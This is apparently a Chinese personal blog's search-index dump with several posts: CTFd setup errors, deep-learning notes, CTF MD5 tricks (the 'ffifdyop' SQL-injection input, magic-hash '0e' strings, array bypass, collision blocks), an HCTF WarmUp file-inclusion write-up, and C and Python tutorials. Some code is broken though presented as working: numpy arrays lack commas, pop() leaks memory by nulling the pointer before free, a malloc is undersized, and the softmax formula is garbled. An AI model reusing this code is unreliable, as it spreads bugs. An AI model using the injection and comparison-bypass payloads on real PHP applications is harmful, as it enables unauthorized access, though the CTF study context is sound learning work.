同理可添加其他题目 搭建中遇到的问题 git clone 命令克隆失败： 1234┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]└─$ sudo git clone https://github.com/CTFTraining/0ctf_2016_unserialize.git 128 ⨯Cloning into &#x27;0ctf_2016_unserialize&#x27;...fatal: unable to access &#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;: Failed to connect to github.com port 443: Connection refused 由于网络问题，可能需要多克隆几次，实在不行可以试试把压缩包下载下来 有些题目克隆下来可能有问题，运行过程中可能会报错（目前仍不了解是什么原因） 1234567891011121314151617181920212223242526272829303132┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]└─$ sudo docker build ./ -t urlstorage 1 ⨯Sending build context to Docker daemon 282.6kBStep 1/7 : FROM ubuntu:18.1018.10: Pulling from library/ubuntu8a532469799e: Pull complete 32f4dcec3531: Pull complete 230f0701585e: Pull complete e01f70622967: Pull complete Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686cStatus: Downloaded newer image for ubuntu:18.10 ---&gt; 9dc19675e327Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=&quot;2.1.1&quot; ---&gt; Running in 98e854ac92f3Removing intermediate container 98e854ac92f3 ---&gt; 154a521cb653Step 3/7 : RUN sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha ---&gt; Running in 8d702a730242Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InReleaseIgn:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InReleaseIgn:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InReleaseErr:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release 404 Not Found [IP: 101.6.15.130 80]Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release 404 Not Found [IP: 101.6.15.130 80]Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release 404 Not Found [IP: 101.6.15.130 80]Reading package lists...E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27; does not have a Release file.E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27; does not have a Release file. E: The repository &#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27; does not have a Release file. The command &#x27;/bin/sh -c sed -i &#x27;s/http:\\/\\/archive.ubuntu.com\\//http:\\/\\/mirrors.tuna.tsinghua.edu.cn\\//g&#x27; /etc/apt/sources.list &amp;&amp; sed -i &#x27;/security/d&#x27; /etc/apt/sources.list &amp;&amp; apt-get -y update &amp;&amp; apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp; mkdir -p /srv/var &amp;&amp; wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp; rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp; mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp; ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp; pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27; returned a non-zero code: 100 许多命令都需要root权限，如果在哪一步运行报错了可以检查以下是否是权限问题","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"Deep Learning from Scratch","slug":"deep_learning_from_scratch","date":"2021-11-28T07:05:56.160Z","updated":"2021-11-30T14:51:29.989Z","comments":true,"path":"2021/11/28/deep_learning_from_scratch/","link":"","permalink":"http://uniqueland.top/2021/11/28/deep_learning_from_scratch/","excerpt":"读书记录","text":"读书记录 收获： 对matplotlib、numpy有了初步认识 了解了一些基础概念 跟随书本实现了简单的逻辑门电路 认识了感知机、激活函数 numpy:123456import numpy as npx = np.array([1.0,2.0,3.0]) #生成数组print(x)print(x.dtype) #查看数据类型print(x.shape) #查看矩阵形状x = x.flatten() #将矩阵转换为一维数组 matplotlib12345678910import matplotlib.pyplot as pltfrom matplotlib.image import imreadx = [1, 2, 3, 4, 5]y = [2, 4, 6, 8, 10]plt.plot(x, y) #绘制图形plt.show() #显示坐标系img = imread(&quot;lena.png&quot;)plt.imshow(img) #显示图像 基础概念 广播：将与矩阵相乘的标量转换为相应大小矩阵的功能 张量：一般化之后的向量或矩阵 感知机：感知机(perceptron)是二类分类的线性分类模型，其输入为实例的特征向量，输出为实例的类别。 简单逻辑门的实现12345678910111213141516171819202122232425262728293031323334353637import numpy as npdef AND(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def NAND(x1, x2): x = np.array([x1, x2]) w = np.array([-0.5 -0.5]) b = 0.7 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def OR(x1, x2): x = np.array([x1, x2]) w = np.array([0.5 0.5]) b = -0.2 tmp = np.sum(w*x) + b if tmp &lt;= 0: return 0 elif tmp &gt; 0: return 1def XOR(x1, x2): s1 = NAND(x1, x2) s2 = OR(x1, x2) y = AND(s1, s2) return y 感知机感知机的局限性​ 单层感知机只能表示线性空间 多层感知机的优势 多层感知机可以实现非线性空间 使用了非线性函数sigmoid作为激活函数的2层感知机可以表示任意函数 激活函数定义：将输入信号的总和转换为输出信号的函数 sigmoid函数：$$h(x) = \\frac{1}{(1+e^{-x})}$$ 阶跃函数： 12345def step_function(x): if x &gt; 0: return 1 else: return 0 或者 123def step_function(x): y = x &gt; 0 return y.astype(np.int) ReLU函数$$h(x)=\\begin{cases}x (x&gt;0)\\0 (x\\leq0)\\\\end{cases}$$ 恒等函数 softmax函数$$y_k=\\frac{e^}{\\sum_{i=1}^ne^{a_i}}$$","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"有关md5的一些信息","slug":"something_about_md5","date":"2021-11-23T15:56:14.073Z","updated":"2021-11-23T16:35:02.663Z","comments":true,"path":"2021/11/23/something_about_md5/","link":"","permalink":"http://uniqueland.top/2021/11/23/something_about_md5/","excerpt":"在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种","text":"在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种 在sql注入中 若遇到了类似以下的情况 123$password=$_POST[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($link,$sql); 可以传入ffifdyop或者129581926211651571912466741651878684928，这两者md5加密后的结果都包含 ‘ OR ‘ 的字样，可用于引号逃逸 在弱类型比较中 若存在对两个md5加密后的字符串进行比较时，可传入类似s1502113478a、s1836677006a的字符串，加密后都是以0e开头，比较时都为零 123456789&lt;?php$a = &quot;s1502113478a&quot;;$b = &quot;s1836677006a&quot;;$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234┌──(kali㉿kali)-[~/Documents]└─$ php md5.php 0e8615801632915612474043813960640e481036490867661113260034900752 在允许传递数组时 可以传入两个空数组，由于md5无法对数组进行加密，故返回null，而 null = null 为 true 123456789&lt;?php$a = array();$b = array();$a_1 = md5($a);$b_1 = md5($b);echo $a_1.&quot;\\n&quot;.$b_1.&quot;\\n&quot;;?&gt; 1234┌──(kali㉿kali)-[~/Documents]└─$ php em_array.php PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 5PHP Warning: md5() expects parameter 1 to be string, array given in /home/kali/Documents/em_array.php on line 6 虽然转换失败，但是返回了 null ，需要注意的是，在传递数组时应使用如下形式： 1a[]=1 &amp; b[1]=&quot;b&quot; &amp; c[] md5碰撞 当上述方法都不奏效时：可以使用md5算法本身的漏洞；md5碰撞指的是不同的输入进行md5加密后得到同样的输出，网上有许多算法可以实现，需要注意的是，由于输入需上传服务器，故需要对输出进行url编码 12345678910111213141516171819202122232425262728293031323334353637383940414243#!coding:utf-8hexString1 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;hexString2 = &#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;hexList1 = []intList1 = []asciiString1 =&#x27;&#x27;while True: intString1 = hexString1[0:2] hexString1 = hexString1[2:] hexList1.append(intString1) if (hexString1 == &#x27;&#x27;): breakfor i in hexList1: intList1.append(int(i,16))for j in intList1: asciiString1 += chr(int(j))f = open(&#x27;1.bin&#x27;,&#x27;w&#x27;)f.write(asciiString1)f.close()hexList2 = []intList2 = []asciiString2 =&#x27;&#x27;while True: intString2 = hexString2[0:2] hexString2 = hexString2[2:] hexList2.append(intString2) if (hexString2 == &#x27;&#x27;): breakfor i in hexList2: intList2.append(int(i,16))for j in intList2: asciiString2 += chr(int(j))f = open(&#x27;2.bin&#x27;,&#x27;w&#x27;)f.write(asciiString2)f.close() 1234567891011121314#!coding:utf-8import urllib.requesturlString1=&#x27;&#x27;urlString2 = &#x27;&#x27;for line in open(&#x27;1.bin&#x27;): urlString1 += urllib.parse.quote(line)for line in open(&#x27;2.bin&#x27;): urlString2 += urllib.parse.quote(line)print(urlString1)print(urlString2)","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"}]},{"title":"HCTF 2018WarmUp 1","slug":"[HCTF 2018]WarmUp 1","date":"2021-11-07T15:15:57.237Z","updated":"2021-11-07T15:57:44.286Z","comments":true,"path":"2021/11/07/[HCTF 2018]WarmUp 1/","link":"","permalink":"http://uniqueland.top/2021/11/07/[HCTF%202018]WarmUp%201/","excerpt":"一上来便是一张天真无邪的笑脸","text":"一上来便是一张天真无邪的笑脸无头绪，f12查源码，发现source.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; 开始代码审计 网页通过对传入的参数进行过滤后进行文件包含 一开始我以为是需要满足所有的条件，但根据下文包含文件的代码发现只需要满足其中一个就足够了 123456789if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; 在尝试了许久之后我发现重点在于最后一个判断，即从解码函数开始的判断；在解码之后出现了新的变量$_page，然后对该变量进行分割，取出变量中问号之前的部分，覆盖原来的变量，再判断该变量是否位于白名单内。 1234567$_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; 判断通过后对文件进行包含，这时遍历文件目录就能找到flag了，文件名称在hint.php里 最终payload：","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"使用C语言实现栈","slug":"stack_by_C","date":"2021-09-05T14:17:42.819Z","updated":"2021-09-05T15:09:46.818Z","comments":true,"path":"2021/09/05/stack_by_C/","link":"","permalink":"http://uniqueland.top/2021/09/05/stack_by_C/","excerpt":"说明 作为栈顶的节点不存储数据","text":"说明 作为栈顶的节点不存储数据，仅作定位功能 数据项的类型可自行定义 在push和pop时，并不改变栈顶节点的位置，仅仅是将待操作节点加入或删除并改变指针指向而已 栈顶节点的数据项可用来存储当前栈的节点数，这点在push函数的定义中可以体现 主函数仅作各函数的演示使用，可自定义 定义相应结构 1234typedef struct node&#123; int data; struct node *next;&#125;node; 该结构由一个整型和一个指向此结构的指针组成。 定义push函数 123456789int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; top-&gt;data++; return data;&#125; 第一步：分配空间 第二步：存储数据 第三步：改变栈顶和新增项的next指针，递增top节点的data项 定义pop函数 12345678910111213int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125; 第一步：判断栈是否为空 第二步：定义变量存储待弹出的数据和待删除节点 第三步：改变栈顶的next指针 释放待删除节点空间，删除节点 定义初始化函数 为栈顶节点分配空间并初始化指针为空 1234567node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125; 定义遍历显示函数 1234567void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125; 将当前节点指向栈顶的下一个节点 当前节点不为空时进入遍历循环 打印当前节点的数据项 将当前节点指向下一个节点 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef struct node&#123; int data; struct node *next;&#125;node;int push(node *top, int data);int pop(node *top);node* stack_init();void display(node *current);int push(node *top, int data)&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = data; temp-&gt;next = top-&gt;next; top-&gt;next = temp; return data;&#125;int pop(node *top)&#123; if(!top-&gt;next)&#123; printf(&quot;Stack is empty now.&quot;); return -1; &#125; int pop_data = top-&gt;next-&gt;data; node *temp = top-&gt;next; top-&gt;next = top-&gt;next-&gt;next; temp = NULL; free(temp); return pop_data;&#125;node* stack_init()&#123; node *temp = (node *)malloc(sizeof(node)); temp-&gt;data = 0; temp-&gt;next = NULL; return temp;&#125;void display(node *current)&#123; current = current-&gt;next; while(current)&#123; printf(&quot;%d\\n&quot;,current-&gt;data); current = current-&gt;next; &#125;&#125;int main()&#123; int first_input; int pop_input, pop_data; node *top = stack_init(); int status; printf(&quot;Enter strings, Ctrl+Z to quit.\\n&quot;); status = scanf(&quot;%d&quot;,&amp;first_input); while(status!=EOF)&#123; push(top, first_input); status = scanf(&quot;%d&quot;,&amp;first_input); &#125; display(top); printf(&quot;Now enter 1 to pop data, 0 to quit.\\n&quot;); scanf(&quot;%d&quot;,&amp;pop_input); while(pop_input==1)&#123; pop_data = pop(top); if(pop_data==-1)&#123; break; &#125; printf(&quot;pop_data: %d\\n&quot;,pop_data); scanf(&quot;%d&quot;,&amp;pop_input); &#125; printf(&quot;\\nDone\\n&quot;); return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"使用C语言实现链表","slug":"link_list_by_C","date":"2021-05-02T06:13:00.666Z","updated":"2021-09-05T14:19:04.270Z","comments":true,"path":"2021/05/02/link_list_by_C/","link":"","permalink":"http://uniqueland.top/2021/05/02/link_list_by_C/","excerpt":"","text":"第一步：定义相应结构 由于实现链表的编程语言为C，不能够使用类，故使用结构来实现链表中的节点； 12345typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link; 该结构由一个字符数组，一项编号和一个指向此结构的指针组成。 第二步：定义输入函数 为了更容易、更准确的获取输入，在程序中重新定义输入函数，在原有fgets()函数的基础上略作修改，得到新的输入函数s_gets()； 1234567891011121314151617char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125; 该函数为返回类型为字符指针、接受参数为一个字符指针和一个整数的输入函数，其中字符指针就是字符数组名称，因为数组名称本质上就是数组首元素的地址，而该数组为字符数组，故该字符数组名称本质上就是字符指针； 在函数内部，我声明了两个字符指针，一个用来接受fgets函数的返回值，一个用来接受查找字符函数(strchr)的返回值； 关于fgets()函数： 如果接受输入的字符数量超过字符数组的大小(MAX_INPUT)，fgets()函数会返回先前传入的地址，即字符数组的名称，并且把末尾的字符换为空字符('\\0')，使之成为一个字符串； 如果接收输入的字符数量在字符数组的大小以内，那么fgets()函数会将空字符放置在换行符之前，然后同样返回先前传入的地址； 需要注意的是：fgets()函数在遇到文件结尾(EOF End Of File)时将会返回一个空指针； 关于strchr()函数： 在某个字符数组中查找某字符，并返回指向该字符的指针 r如果字符串中不包含该字符，则返回一个空指针 经过重写，修改如下： 首先使用fgets()函数接收输入，并将返回值存储在指针ret_val中，然后对该指针进行判断，如果不为空指针，则使用字符查找函数查找换行符，并将该换行符替换为空字符，如果查找换行符失败，说明输入的字符数量超过了字符数组的大小，这时使用一个while循环接收其余的输入并抛弃；如果ret_val为空指针，说明遇到文件结尾；最后返回ret_val； 第三步：编写主函数进行测试 12345678910111213141516171819202122232425int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125; 首先声明一个字符数组用来储存输入，然后声明一个节点类型的指针作为头节点，并为其分配内存，接着再声明一个同样的临时指针指向该头指针，这里使用临时指针的目的是作为当前指针与下一个指针的过渡指针，同时保持头指针指向的内容不变，方便最后的输出； 在输出提示信息之后进入循环，退出条件为输入空行；在循环中，首先声明指向当前节点的指针并为其分配内存，接着将该指针指向的结构中的指针声明为NULL，然后将当前节点的指针赋给临时指针指向的结构的指针，使其与上一个节点相连，然后再将临时指针指向的指针赋给自身(其实就相当于使临时指针指向下一个节点)；接着将刚刚接收的输入复制到当前节点的name变量中，然后再接收编号的输入并存储到当前节点的number变量中；值得注意的是，在使用scanf()函数接收输入后该函数似乎会将换行符留在缓存区中，所以这里需要使用getchar()函数来将该换行符从缓存区中去除； 在循环结束之后，我将临时指针指向了头节点的下一个节点(请注意，头节点中并没有储存除下一个节点的地址之外的任何信息，故此处从头节点的下一个节点开始)；然后进入下一个while循环，退出条件为临时指针为空指针(因为在上一个while循环中已经将当前节点中的指针声明为NULL了，所以一旦第一个循环结束，最后一个节点中的指针必为NULL)，然后打印出当前节点的信息并将临时指针指向下一个节点。 源代码 最后附上源代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define MAX_INPUT 20char* s_gets(char* st, int n);char* s_gets(char* st, int n) &#123; char* ret_val; char* find; ret_val = fgets(st, n, stdin); if (ret_val) &#123; find = strchr(st, &#x27;\\n&#x27;); if (find) &#123; *find = &#x27;\\0&#x27;; &#125; else &#123; while (getchar() != &#x27;\\n&#x27;) &#123; continue; &#125; &#125; &#125; return ret_val;&#125;typedef struct LinkList &#123; char name[MAX_INPUT]; long number; LinkList* next;&#125;Link;int main() &#123; char input[MAX_INPUT]; Link* p = (Link*)malloc(sizeof(Link*)); Link* temp = p; printf(&quot;Now start recording: \\n&quot;); printf(&quot;Name : &quot;); while (s_gets(input,MAX_INPUT) != NULL &amp;&amp; input[0] != &#x27;\\0&#x27;) &#123; Link* a = (Link*)malloc(sizeof(Link)); a-&gt;next = NULL; temp-&gt;next = a; temp = temp-&gt;next; strcpy(a-&gt;name, input); printf(&quot;Number: &quot;); scanf(&quot;%ld&quot;, &amp;(a-&gt;number)); getchar(); printf(&quot;Name : &quot;); &#125; temp = p-&gt;next; printf(&quot;Recorded Data: \\n&quot;); while (temp) &#123; printf(&quot;Name: %s\\tNumber: %ld\\n&quot;, temp-&gt;name, temp-&gt;number); temp = temp-&gt;next; &#125; return 0;&#125;","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"}]},{"title":"用Python编写一个能将图片转换为字符画的程序","slug":"用Python编写一个能将图片转换为字符画的程序","date":"2021-04-09T16:46:04.299Z","updated":"2020-11-10T02:54:55.042Z","comments":true,"path":"2021/04/10/用Python编写一个能将图片转换为字符画的程序/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081\\# -*- coding=utf-8 -*- from PIL import Image import argparse #命令行输入参数处理 parser = argparse.ArgumentParser() parser.add_argument(&#x27;file&#x27;) #输入文件parser.add_argument(&#x27;-o&#x27;, &#x27;--output&#x27;) #输出文件 parser.add_argument(&#x27;--width&#x27;, type = int, default = 80) #输出字符画宽 parser.add_argument(&#x27;--height&#x27;, type = int, default = 80) #输出字符画高 #获取参数 args = parser.parse_args() IMG = args.fileWIDTH = args.width HEIGHT = args.height OUTPUT = args.output ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\\&quot;^&#x27;. &quot;) # 将256灰度映射到70个字符上 def get_char(r,g,b,alpha = 256): ​ if alpha == 0: ​ return &#x27; &#x27; ​ length = len(ascii_char) ​ gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b) ​ unit = (256.0 + 1)/length ​ return ascii_char[int(gray/unit)] if __name__ == &#x27;__main__&#x27;: ​ im = Image.open(IMG) ​ im = im.resize((WIDTH,HEIGHT), Image.NEAREST) ​ txt = &quot;&quot; ​ for i in range(HEIGHT): ​ for j in range(WIDTH): ​ txt += get_char(*im.getpixel((j,i))) ​ txt += &#x27;\\n&#x27; ​ print(txt) #字符画输出到文件 ​ if OUTPUT: ​ with open(OUTPUT,&#x27;w&#x27;) as f: ​ f.write(txt) ​ else: ​ with open(&quot;output.txt&quot;,&#x27;w&#x27;) as f: ​ f.write(txt)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"人工智能入门-查找","slug":"人工智能入门-搜索","date":"2021-04-09T16:46:04.298Z","updated":"2021-05-02T06:00:22.634Z","comments":true,"path":"2021/04/10/人工智能入门-搜索/","link":"","permalink":"http://uniqueland.top/2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/","excerpt":"概述 众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。","text":"概述 众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。 也许有人会说，导航不就是电子地图嘛？和人工智能有什么关系？但其实在导航中人工智能发挥了很重要的作用。“条条大路通罗马”，为什么导航会向你推荐这条路而不推荐另一条路？这其中就涉及到了人工智能中的搜索算法。 在搜索中，往往有初始状态(initial states)、目标状态(goal states)，而人工智能所做的，就是在众多情形中，找到众多解决方法的最优解，其中会涉及到循环和迭代，假如我们现在有一个初始状态，我们要怎样达到目标状态呢？ 概念介绍 在这之前需要先了解一些概念： 动作：通常是接受状态的函数，返回在此状态中应该做出的决策 迁移模型：通常是接受状态和动作的函数，返回在此状态下做出此种决策后的新状态 节点：数据结构，用来记录状态，父节点，动作和路径成本 边界：数据结构，用来区分已探索的部分和未探索的部分 算法讨论 在了解了相关概念之后，我们开始讨论算法： 首先将初始状态放入边界，然后进入循环 如果边界为空，则无解 从边界中移去一个节点 如果此节点包含目标状态，则追踪父节点，然后返回解决方案 扩张节点并将其加入边界 下面举个例子： 假设我们现在的要求是找到从A到E的路径 第一步我们将A（初始状态）放入边界，进入循环 因为A不是目标状态，将A移出边界并将B加入边界 因为B不是目标状态，将B移出边界并将C和D加入边界 因为C不是目标状态，将C移出边界并将E加入边界 因为E是目标状态，所以我们返回从A到E的路径，循环结束 至此，我们就解决了一个非常简单的路径搜索问题，当然，这个算法还存在着许多问题，比如：如何确保算法不会重新检查当前状态的父节点？如果重复检查父节点，那么程序将进入无限死循环。解决方法很简单，使用一个数据结构来储存已检查过的节点，然后在每次检查节点时遍历此数据结构，如果存在与之相同的节点则不检查。 那么在实际情况下是怎么样的呢？ 实战 下面进入实战环节： 情境：你现在有一张迷宫地图，起点为A，终点为B，需要编写程序令计算机自行找出离开迷宫的路并显示在屏幕上 12345678910111213141516171819# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # 我们将这个待实现的程序按照之前所讨论的分为几个部分： 如图所示，我们主要将程序分为三个部分： 首先是定义相关的变量，并且将初始状态放入边界； 然后进入循环： 第一步：检查边界的长度，如果等于0则说明无解 第二步：从边界中移去一个节点，并将此节点添加到表示已探索的数据结构 第三步：检查被移去的节点，如果此节点包含目标状态，则追踪其父节点，并返回路径 最后，我们使用一个循环来追踪完整的路径，并将其显示在屏幕上。 以下是根据思路实现的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, 